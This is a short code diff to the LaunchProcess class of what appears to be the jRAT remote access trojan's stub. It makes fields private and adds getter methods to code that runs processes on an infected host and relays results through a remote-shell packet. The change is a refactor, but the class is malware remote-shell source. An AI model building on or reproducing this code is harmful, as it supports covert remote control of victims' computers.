@@ -9,9 +9,9 @@ import se.jrat.stub.packets.outgoing.Packet21RemoteShell;
 public class LaunchProcess extends Thread {
 
 	private Connection con;
-	public Process p;
-	public String process;
-	public static LaunchProcess latest;
+	private Process p;
+	private String process;
+	private static LaunchProcess latest;
 
 	public LaunchProcess(Connection con, String process) {
 		this.con = con;
@@ -36,6 +36,17 @@ public class LaunchProcess extends Thread {
 			con.addToSendQueue(new Packet21RemoteShell("Failed to create process " + process + ": " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
 			latest = null;
 		}
+	}
+	
+	public Process getProcess() {
+		return p;
+	}
+	
+	/**
+	 * @return the latest ran process
+	 */
+	public static LaunchProcess getLatest() {
+		return latest;
 	}
 
 }
